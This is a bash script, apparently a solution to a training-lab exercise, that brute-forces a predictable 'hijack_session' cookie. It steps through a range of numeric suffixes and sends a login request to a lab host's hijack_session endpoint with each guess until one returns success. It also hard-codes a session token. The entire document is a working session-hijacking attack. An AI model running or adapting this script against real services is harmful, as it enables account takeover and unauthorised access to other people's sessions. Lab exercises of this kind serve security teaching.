#!/bin/bash

SESSION="tOZldT-nZMPCBBiT4FSQR3JnEZFrTZ_KmaPC2LBHBOU.BQ9ExPnRHpQ3WAfytSxOErOZpY4"
PFX="44040f20-e21d-4d0b-970"
A0=7608615
B0=17719253037

DB=-400
while [ "$DB" -le 400 ]
do
  B=$((B0 + DB))
  HIJ="$PFX-$A0-$B"

  RES=$(curl -s \
    -H "Content-Type: application/json" \
    -H "Cookie: session=$SESSION; hijack_session=$HIJ" \
    -d '{"email":"a@a.com","password":"a"}' \
    http://web0x01.hbtn/api/a1/hijack_session/login)

  echo "$RES" | grep -q '"status":"success"'
  if [ "$?" -eq 0 ]
  then
    echo "FOUND $HIJ"
    echo "$RES"
    exit 0
  fi

  DB=$((DB + 1))
done

echo "No success with A fixed"
exit 1
